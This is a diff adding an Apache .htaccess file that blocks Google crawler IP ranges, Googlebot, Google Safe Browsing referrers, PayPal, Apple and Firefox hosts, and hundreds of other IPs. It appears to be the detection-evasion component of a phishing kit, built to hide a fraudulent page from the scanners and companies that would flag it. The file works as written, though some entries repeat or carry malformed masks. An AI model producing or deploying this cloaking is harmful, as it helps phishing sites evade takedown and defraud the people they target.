@@ -1,0 +1,609 @@
+# BAN USER BY IP
+<Limit GET POST>
+order allow,deny
+allow from all
+deny from 66.102.
+deny from 2001:4860:4801:10::/64
+deny from 2001:4860:4801:11::/64
+deny from 2001:4860:4801:12::/64
+deny from 2001:4860:4801:13::/64
+deny from 2001:4860:4801:14::/64
+deny from 2001:4860:4801:15::/64
+deny from 2001:4860:4801:16::/64
+deny from 2001:4860:4801:17::/64
+deny from 2001:4860:4801:18::/64
+deny from 2001:4860:4801:19::/64
+deny from 2001:4860:4801:20::/64
+deny from 2001:4860:4801:21::/64
+deny from 2001:4860:4801:22::/64
+deny from 2001:4860:4801:23::/64
+deny from 2001:4860:4801:24::/64
+deny from 2001:4860:4801:25::/64
+deny from 2001:4860:4801:2::/64
+deny from 2001:4860:4801:26::/64
+deny from 2001:4860:4801:27::/64
+deny from 2001:4860:4801:28::/64
+deny from 2001:4860:4801:29::/64
+deny from 2001:4860:4801:2a::/64
+deny from 2001:4860:4801:2b::/64
+deny from 2001:4860:4801:2c::/64
+deny from 2001:4860:4801:2d::/64
+deny from 2001:4860:4801:2e::/64
+deny from 2001:4860:4801:2f::/64
+deny from 2001:4860:4801:30::/64
+deny from 2001:4860:4801:31::/64
+deny from 2001:4860:4801:32::/64
+deny from 2001:4860:4801:33::/64
+deny from 2001:4860:4801:34::/64
+deny from 2001:4860:4801:35::/64
+deny from 2001:4860:4801:3::/64
+deny from 2001:4860:4801:36::/64
+deny from 2001:4860:4801:37::/64
+deny from 2001:4860:4801:38::/64
+deny from 2001:4860:4801:39::/64
+deny from 2001:4860:4801:3a::/64
+deny from 2001:4860:4801:3b::/64
+deny from 2001:4860:4801:40::/64
+deny from 2001:4860:4801:41::/64
+deny from 2001:4860:4801:42::/64
+deny from 2001:4860:4801:43::/64
+deny from 2001:4860:4801:44::/64
+deny from 2001:4860:4801:45::/64
+deny from 2001:4860:4801:46::/64
+deny from 2001:4860:4801:47::/64
+deny from 2001:4860:4801:48::/64
+deny from 2001:4860:4801:49::/64
+deny from 2001:4860:4801:4a::/64
+deny from 2001:4860:4801:50::/64
+deny from 2001:4860:4801:51::/64
+deny from 2001:4860:4801:53::/64
+deny from 2001:4860:4801:60::/64
+deny from 2001:4860:4801:61::/64
+deny from 2001:4860:4801:62::/64
+deny from 2001:4860:4801:63::/64
+deny from 2001:4860:4801::/64
+deny from 2001:4860:4801:64::/64
+deny from 2001:4860:4801:65::/64
+deny from 2001:4860:4801:66::/64
+deny from 2001:4860:4801:67::/64
+deny from 2001:4860:4801:68::/64
+deny from 2001:4860:4801:69::/64
+deny from 2001:4860:4801:6a::/64
+deny from 2001:4860:4801:6b::/64
+deny from 2001:4860:4801:6c::/64
+deny from 2001:4860:4801:6d::/64
+deny from 2001:4860:4801:6e::/64
+deny from 2001:4860:4801:6f::/64
+deny from 2001:4860:4801:70::/64
+deny from 2001:4860:4801:71::/64
+deny from 2001:4860:4801:72::/64
+deny from 2001:4860:4801:73::/64
+deny from 2001:4860:4801:74::/64
+deny from 2001:4860:4801:75::/64
+deny from 2001:4860:4801:76::/64
+deny from 2001:4860:4801:77::/64
+deny from 2001:4860:4801:80::/64
+deny from 2001:4860:4801:81::/64
+deny from 2001:4860:4801:82::/64
+deny from 2001:4860:4801:83::/64
+deny from 2001:4860:4801:84::/64
+deny from 2001:4860:4801:85::/64
+deny from 2001:4860:4801:86::/64
+deny from 2001:4860:4801:90::/64
+deny from 2001:4860:4801:91::/64
+deny from 2001:4860:4801:c::/64
+deny from 2001:4860:4801:f::/64
+deny from 66.249.64.0/27
+deny from 66.249.64.128/27
+deny from 66.249.64.160/27
+deny from 66.249.64.192/27
+deny from 66.249.64.224/27
+deny from 66.249.64.32/27
+deny from 66.249.64.64/27
+deny from 66.249.64.96/27
+deny from 66.249.65.0/27
+deny from 66.249.65.128/27
+deny from 66.249.65.160/27
+deny from 66.249.65.192/27
+deny from 66.249.65.224/27
+deny from 66.249.65.32/27
+deny from 66.249.65.64/27
+deny from 66.249.65.96/27
+deny from 66.249.66.0/27
+deny from 66.249.66.128/27
+deny from 66.249.66.192/27
+deny from 66.249.66.32/27
+deny from 66.249.66.64/27
+deny from 66.249.68.0/27
+deny from 66.249.68.32/27
+deny from 66.249.68.64/27
+deny from 66.249.69.0/27
+deny from 66.249.69.128/27
+deny from 66.249.69.160/27
+deny from 66.249.69.192/27
+deny from 66.249.69.224/27
+deny from 66.249.69.32/27
+deny from 66.249.69.64/27
+deny from 66.249.69.96/27
+deny from 66.249.70.0/27
+deny from 66.249.70.128/27
+deny from 66.249.70.32/27
+deny from 66.249.70.64/27
+deny from 66.249.70.96/27
+deny from 66.249.71.0/27
+deny from 66.249.71.128/27
+deny from 66.249.71.160/27
+deny from 66.249.71.192/27
+deny from 66.249.71.32/27
+deny from 66.249.71.64/27
+deny from 66.249.71.96/27
+deny from 66.249.72.0/27
+deny from 66.249.72.128/27
+deny from 66.249.72.160/27
+deny from 66.249.72.192/27
+deny from 66.249.72.224/27
+deny from 66.249.72.32/27
+deny from 66.249.72.64/27
+deny from 66.249.72.96/27
+deny from 66.249.73.0/27
+deny from 66.249.73.128/27
+deny from 66.249.73.160/27
+deny from 66.249.73.192/27
+deny from 66.249.73.224/27
+deny from 66.249.73.32/27
+deny from 66.249.73.64/27
+deny from 66.249.73.96/27
+deny from 66.249.74.0/27
+deny from 66.249.74.32/27
+deny from 66.249.74.64/27
+deny from 66.249.75.0/27
+deny from 66.249.75.128/27
+deny from 66.249.75.160/27
+deny from 66.249.75.192/27
+deny from 66.249.75.224/27
+deny from 66.249.75.32/27
+deny from 66.249.75.64/27
+deny from 66.249.75.96/27
+deny from 66.249.76.0/27
+deny from 66.249.76.128/27
+deny from 66.249.76.160/27
+deny from 66.249.76.192/27
+deny from 66.249.76.224/27
+deny from 66.249.76.32/27
+deny from 66.249.76.64/27
+deny from 66.249.76.96/27
+deny from 66.249.77.0/27
+deny from 66.249.77.32/27
+deny from 66.249.77.64/27
+deny from 66.249.79.0/27
+deny from 66.249.79.128/27
+deny from 66.249.79.160/27
+deny from 66.249.79.192/27
+deny from 66.249.79.224/27
+deny from 66.249.79.32/27
+deny from 66.249.79.64/27
+deny from 66.249.79.96/27
+</Limit>
+
+RewriteEngine on
+# Options +FollowSymlinks
+RewriteCond %{HTTP_REFERER} google\.com [NC,OR]
+RewriteCond %{HTTP_REFERER} google\.com
+RewriteCond %{HTTP_REFERER} paypal\.com
+RewriteCond %{HTTP_REFERER} firefox\.com
+RewriteRule .* - [F]
+RewriteCond %{HTTP_USER_AGENT} ^googlebot [OR] 
+RewriteCond %{HTTP_USER_AGENT} ^BlackWidow [OR] 
+RewriteCond %{HTTP_USER_AGENT} ^ChinaClaw [OR] 
+RewriteCond %{HTTP_USER_AGENT} ^Custo [OR] 
+RewriteCond %{HTTP_USER_AGENT} ^DISCo [OR] 
+RewriteCond %{HTTP_USER_AGENT} ^Download\ Demon [OR] 
+RewriteCond %{HTTP_USER_AGENT} ^eCatch [OR] 
+RewriteCond %{HTTP_USER_AGENT} ^EirGrabber [OR] 
+RewriteCond %{HTTP_USER_AGENT} ^EmailSiphon [OR] 
+RewriteCond %{HTTP_USER_AGENT} ^EmailWolf [OR] 
+RewriteCond %{HTTP_USER_AGENT} ^Express\ WebPictures [OR] 
+RewriteCond %{HTTP_USER_AGENT} ^ExtractorPro [OR] 
+RewriteCond %{HTTP_USER_AGENT} ^EyeNetIE [OR] 
+RewriteCond %{HTTP_USER_AGENT} ^FlashGet [OR] 
+RewriteCond %{HTTP_USER_AGENT} ^GetRight [OR] 
+RewriteCond %{HTTP_USER_AGENT} ^GetWeb! [OR] 
+RewriteCond %{HTTP_USER_AGENT} ^Go!Zilla [OR] 
+RewriteCond %{HTTP_USER_AGENT} ^Go-Ahead-Got-It [OR] 
+RewriteCond %{HTTP_USER_AGENT} ^GrabNet [OR] 
+RewriteCond %{HTTP_USER_AGENT} ^Grafula [OR] 
+RewriteCond %{HTTP_USER_AGENT} ^HMView [OR] 
+RewriteCond %{HTTP_USER_AGENT} HTTrack [NC,OR] 
+RewriteCond %{HTTP_USER_AGENT} ^Image\ Stripper [OR] 
+RewriteCond %{HTTP_USER_AGENT} ^Image\ Sucker [OR] 
+RewriteCond %{HTTP_USER_AGENT} Indy\ Library [NC,OR] 
+RewriteCond %{HTTP_USER_AGENT} ^InterGET [OR] 
+RewriteCond %{HTTP_USER_AGENT} ^Internet\ Ninja [OR] 
+RewriteCond %{HTTP_USER_AGENT} ^JetCar [OR] 
+RewriteCond %{HTTP_USER_AGENT} ^JOC\ Web\ Spider [OR] 
+RewriteCond %{HTTP_USER_AGENT} ^larbin [OR] 
+RewriteCond %{HTTP_USER_AGENT} ^LeechFTP [OR] 
+RewriteCond %{HTTP_USER_AGENT} ^Mass\ Downloader [OR] 
+RewriteCond %{HTTP_USER_AGENT} ^MIDown\ tool [OR] 
+RewriteCond %{HTTP_USER_AGENT} ^Mister\ PiX [OR] 
+RewriteCond %{HTTP_USER_AGENT} ^Navroad [OR] 
+RewriteCond %{HTTP_USER_AGENT} ^NearSite [OR] 
+RewriteCond %{HTTP_USER_AGENT} ^NetAnts [OR] 
+RewriteCond %{HTTP_USER_AGENT} ^NetSpider [OR] 
+RewriteCond %{HTTP_USER_AGENT} ^Net\ Vampire [OR] 
+RewriteCond %{HTTP_USER_AGENT} ^NetZIP [OR] 
+RewriteCond %{HTTP_USER_AGENT} ^Octopus [OR] 
+RewriteCond %{HTTP_USER_AGENT} ^Offline\ Explorer [OR] 
+RewriteCond %{HTTP_USER_AGENT} ^Offline\ Navigator [OR] 
+RewriteCond %{HTTP_USER_AGENT} ^PageGrabber [OR] 
+RewriteCond %{HTTP_USER_AGENT} ^Papa\ Foto [OR] 
+RewriteCond %{HTTP_USER_AGENT} ^pavuk [OR] 
+RewriteCond %{HTTP_USER_AGENT} ^pcBrowser [OR] 
+RewriteCond %{HTTP_USER_AGENT} ^RealDownload [OR] 
+RewriteCond %{HTTP_USER_AGENT} ^ReGet [OR] 
+RewriteCond %{HTTP_USER_AGENT} ^SiteSnagger [OR] 
+RewriteCond %{HTTP_USER_AGENT} ^SmartDownload [OR] 
+RewriteCond %{HTTP_USER_AGENT} ^SuperBot [OR] 
+RewriteCond %{HTTP_USER_AGENT} ^SuperHTTP [OR] 
+RewriteCond %{HTTP_USER_AGENT} ^Surfbot [OR] 
+RewriteCond %{HTTP_USER_AGENT} ^tAkeOut [OR] 
+RewriteCond %{HTTP_USER_AGENT} ^Teleport\ Pro [OR] 
+RewriteCond %{HTTP_USER_AGENT} ^VoidEYE [OR] 
+RewriteCond %{HTTP_USER_AGENT} ^Web\ Image\ Collector [OR] 
+RewriteCond %{HTTP_USER_AGENT} ^Web\ Sucker [OR] 
+RewriteCond %{HTTP_USER_AGENT} ^WebAuto [OR] 
+RewriteCond %{HTTP_USER_AGENT} ^WebCopier [OR] 
+RewriteCond %{HTTP_USER_AGENT} ^WebFetch [OR] 
+RewriteCond %{HTTP_USER_AGENT} ^WebGo\ IS [OR] 
+RewriteCond %{HTTP_USER_AGENT} ^WebLeacher [OR] 
+RewriteCond %{HTTP_USER_AGENT} ^WebReaper [OR] 
+RewriteCond %{HTTP_USER_AGENT} ^WebSauger [OR] 
+RewriteCond %{HTTP_USER_AGENT} ^Website\ eXtractor [OR] 
+RewriteCond %{HTTP_USER_AGENT} ^Website\ Quester [OR] 
+RewriteCond %{HTTP_USER_AGENT} ^WebStripper [OR] 
+RewriteCond %{HTTP_USER_AGENT} ^WebWhacker [OR] 
+RewriteCond %{HTTP_USER_AGENT} ^WebZIP [OR] 
+RewriteCond %{HTTP_USER_AGENT} ^Wget [OR] 
+RewriteCond %{HTTP_USER_AGENT} ^Widow [OR] 
+RewriteCond %{HTTP_USER_AGENT} ^WWWOFFLE [OR] 
+RewriteCond %{HTTP_USER_AGENT} ^Xaldon\ WebSpider [OR] 
+RewriteCond %{HTTP_USER_AGENT} ^Zeus 
+RewriteRule ^.* - [F,L]
+RewriteEngine on
+RewriteCond %{HTTP_REFERER} ^http(s)?://(www\.)?http://safebrowsing-cache.google.com/.*$ [NC]
+RewriteRule .* - [F,L]
+
+Options -Indexes
+order allow,deny
+deny from 64.71.197.77
+deny from 206.207.80.170
+deny from 209.19.183.248
+deny from 64.71.201.247
+deny from 209.19.179.245
+deny from 206.80.114.190
+deny from 64.71.198.162
+deny from 64.71.207.10
+deny from 206.207.80.168
+deny from 209.19.152.74
+deny from 206.80.118.120
+deny from 209.19.189.108
+deny from 64.71.207.203
+deny from 209.19.186.71
+deny from 209.19.152.75
+deny from 64.71.200.77
+deny from 64.71.199.176
+deny from 104.132.247.88
+deny from 64.71.196.172
+deny from 209.19.170.50
+deny from 64.71.196.14
+deny from 64.71.201.209
+deny from 209.19.138.102
+deny from 209.19.184.208
+deny from 209.19.187.242
+deny from 206.80.118.113
+deny from 64.71.195.186
+deny from 206.80.118.116
+deny from 64.71.192.195
+deny from 216.162.219.150
+deny from 64.71.198.115
+deny from 64.71.202.74
+deny from 64.71.194.100
+deny from 64.246.187.81
+deny from 209.19.138.103
+deny from 197.2.133.98
+deny from 64.246.187.107
+deny from 64.246.188.69
+deny from 64.246.166.72
+deny from 206.207.116.59
+deny from 50.234.170.199
+deny from 64.71.204.220
+deny from 64.71.202.196
+deny from 209.19.176.228
+deny from 209.19.188.7
+deny from 209.19.181.177
+deny from 209.19.181.227
+deny from 64.71.205.198
+deny from 64.71.193.33
+deny from 209.19.187.136
+deny from 64.71.205.169
+deny from 209.19.176.140
+deny from 209.19.189.85
+deny from 209.19.188.220
+deny from 64.71.202.45
+deny from 64.71.196.84
+deny from 206.80.114.186
+deny from 207.70.3.139
+deny from 72.12.194.94
+deny from 72.12.194.90
+deny from 64.246.166.236
+deny from 207.70.60.22
+deny from 64.246.166.155
+deny from 64.71.202.238
+deny from 209.19.177.88
+deny from 216.162.192.151
+deny from 206.207.116.60
+deny from 209.19.176.41
+deny from 209.19.170.51
+deny from 216.162.219.196
+deny from 209.19.182.43
+deny from 64.246.163.185
+deny from 209.19.188.92
+deny from 64.246.162.209
+deny from 206.207.177.172
+deny from 209.19.178.174
+deny from 64.246.163.162
+deny from 64.71.197.26
+deny from 64.246.183.91
+deny from 209.19.176.166
+deny from 64.246.187.106
+deny from 64.71.203.40
+deny from 64.71.195.216
+deny from 64.246.183.72
+deny from 209.19.138.100
+deny from 64.246.166.142
+deny from 64.71.201.109
+deny from 64.246.166.249
+deny from 206.80.115.118
+deny from 207.70.3.142
+deny from 207.70.25.59
+deny from 209.19.138.97
+deny from 209.19.189.152
+deny from 207.70.60.22
+deny from 64.71.197.231
+deny from 64.246.162.246
+deny from 206.80.118.123
+deny from 207.70.3.141
+deny from 207.70.25.62
+deny from 64.71.206.154
+deny from 209.19.183.36
+deny from 209.19.182.104
+deny from 64.71.198.116
+deny from 64.71.203.208
+deny from 216.162.192.185
+deny from 207.70.60.21
+deny from 209.19.183.71
+deny from 64.71.206.16
+deny from 206.207.116.60
+deny from 216.162.192.150
+deny from 64.71.206.43
+deny from 206.80.115.113
+deny from 104.229.136.238
+deny from 206.80.112.116
+deny from 64.71.195.181
+deny from 64.71.200.62
+deny from 64.71.193.201
+deny from 207.70.9.105
+deny from 206.207.117.174
+deny from 64.246.162.235
+deny from 207.70.25.58
+deny from 209.19.190.19
+deny from 209.19.152.66
+deny from 216.162.219.230
+deny from 64.71.203.95
+deny from 64.71.200.204
+deny from 209.19.176.48
+deny from 207.70.25.61
+deny from 206.207.80.163
+deny from 207.70.9.101
+deny from 206.207.116.58
+deny from 63.151.67.124
+deny from 154.120.101.77
+deny from 209.19.190.167
+deny from 174.229.133.133
+deny from 64.71.207.164
+deny from 64.71.193.25
+deny from 64.71.192.170
+deny from 154.118.58.205
+deny from 64.71.195.61
+deny from 209.19.179.39
+deny from 64.71.192.174
+deny from 209.19.186.159
+deny from 64.71.192.223
+deny from 64.71.193.204
+deny from 216.162.192.205
+deny from 209.19.177.174
+deny from 64.71.192.97
+deny from 64.246.162.237
+deny from 209.19.177.226
+deny from 206.80.115.115
+deny from 207.70.60.19
+deny from 206.80.118.115
+deny from 64.71.197.4
+deny from 209.19.188.54
+deny from 206.207.116.61
+deny from 206.80.115.113
+deny from 209.19.176.145
+deny from 206.207.117.172
+deny from 64.246.166.243
+deny from 209.19.178.196
+deny from 64.71.196.150
+deny from 64.246.162.239
+deny from 209.19.183.200
+deny from 207.70.9.97
+deny from 64.246.166.86
+deny from 64.71.205.243
+deny from 64.71.202.232
+deny from 72.12.194.90
+deny from 72.12.194.91
+deny from 72.12.194.92
+deny from 64.71.197.167
+deny from 64.246.188.72
+deny from 207.70.9.101
+deny from 209.19.179.80
+deny from 64.246.187.88
+deny from 216.162.219.238
+deny from 64.71.201.239
+deny from 64.246.183.87
+deny from 207.70.9.102
+deny from 64.71.195.144
+deny from 209.19.152.68
+deny from 64.246.166.73
+deny from 209.19.170.61
+deny from 89.207.18.182/22
+deny from 173.194.69.147/22
+deny from 149.3.176.145/22
+deny from 66.235.156.128/22
+deny from 173.194.69.125/22
+deny from 173.194.69.120/22
+deny from 173.194.69.102/22
+deny from 173.194.69.95/22
+deny from 173.194.69.94/22
+deny from 173.194.69.91/22
+deny from 173.0.88.2/22
+deny from 173.0.84.2/22
+deny from 173.0.84.34/22
+deny from 173.0.88.2/22
+deny from 173.0.88.34/22
+deny from 2.20.6.85/22
+deny from 63.245.213.92/22
+deny from 173.194.69.106/22
+deny from 173.194.69.147/22
+deny from 173.194.69.99/22
+deny from 173.194.69.103/22
+deny from 173.194.69.104/22
+deny from 173.194.69.105/22
+deny from 173.194.69.94/22
+deny from 173.194.69.106/22
+deny from 173.194.69.147/22
+deny from 173.194.69.99/22
+deny from 173.194.69.103/22
+deny from 173.194.69.104/22
+deny from 173.194.69.105/22
+deny from 173.194.69.94/22
+deny from 63.245.213.92/22
+deny from 63.245.217.20/22
+deny from 64.62.203.172/22
+deny from 173.194.69.102/22
+deny from 173.194.69.113/22
+deny from 173.194.69.138/22
+deny from 173.194.69.139/22
+deny from 173.194.69.100/22
+deny from 173.194.69.101/22
+deny from 64.62.203.172/22
+deny from 63.245.217.71/22
+deny from 188.112.175.207/22
+deny from 66.235.139.166/22
+deny from 66.235.138.2/22
+deny from 66.235.138.59/22
+deny from 66.235.139.153/22
+deny from 66.235.139.152/22
+deny from 66.235.138.44/22
+deny from 66.235.139.118/22
+deny from 66.235.138.18/22
+deny from 66.235.139.121/22
+deny from 66.235.138.19/22
+deny from 66.235.134.160/22
+deny from 66.235.133.8/22
+deny from 66.235.133.52/22
+deny from 66.235.133.33/22
+deny from 66.235.132.152/22
+deny from 66.235.133.62/22
+deny from 66.235.132.232/22
+deny from 66.235.132.118/22
+deny from 66.235.133.11/22
+deny from 66.235.132.121/22
+deny from 149.20.57.227
+deny from 199.48.147.36
+deny from 37.59.162.218
+deny from 89.122.57.201
+deny from 69.163.205.29
+deny from 74.120.15.150
+deny from 109.163.233.200
+deny from 79.120.86.20
+deny from 31.172.30.4
+deny from 109.65.136.19
+deny from 66.150.14.185
+deny from 50.97.98.130
+deny from 66.150.14.185
+deny from 80.237.226.73
+deny from 64.34.184.153
+deny from 66.230.230.230
+deny from 71.165.245.158
+deny from 74.120.15.150
+deny from 76.73.56.7
+deny from 77.109.139.87
+deny from 81.218.219.122
+deny from 83.86.110.188
+deny from 83.142.228.14
+deny from 83.249.87.238
+deny from 85.17.92.13
+deny from 85.235.31.248
+deny from 87.118.104.203
+deny from 88.80.28.70
+deny from 88.208.121.151
+deny from 89.253.97.235
+deny from 91.121.170.32
+deny from 94.249.153.47
+deny from 95.143.193.145
+deny from 109.169.29.56
+deny from 109.123.119.163
+deny from 137.56.163.46
+deny from 137.56.163.64
+deny from 173.193.221.28
+deny from 192.251.226.205
+deny from 192.251.226.206
+deny from 199.48.147.35
+deny from 199.48.147.36
+deny from 199.48.147.38
+deny from 199.48.147.40
+deny from 199.48.147.41
+deny from 208.66.135.190
+deny from 209.44.114.178
+deny from 209.159.142.164
+deny from 209.159.143.130
+deny from 213.220.233.230
+deny from 8.18.38.105 
+deny from 62.141.58.13
+deny from 62.163.180.154
+deny from 77.171.107.207
+deny from 78.47.251.152   
+deny from 81.169.155.246
+deny from 82.194.86.135
+deny from 83.163.192.49
+deny from 91.121.152.114 
+deny from 91.213.50.235
+deny from 93.167.245.178 
+deny from 94.23.215.184
+deny from 174.138.169.218
+deny from 64.34.162.160 
+deny from 66.249.9.107   
+deny from 66.96.16.32 
+deny from 78.107.233.68
+deny from 78.107.237.16
+deny from 83.170.92.9   
+deny from 85.214.73.63 
+deny from 91.124.187.225 
+deny from 194.0.229.54
+deny from 195.43.157.85 
+deny from 212.78.238.92 
+deny from 217.114.211.20  
+deny from 62.24.222.132
+deny from 62.24.222.131
+deny from 66.235.133.14/22
+deny from google.com
+deny from paypal.com
+deny from 112.2o7.com
+deny from firefox.com
+deny from apple.com
+deny from env=stealthed
+allow from all
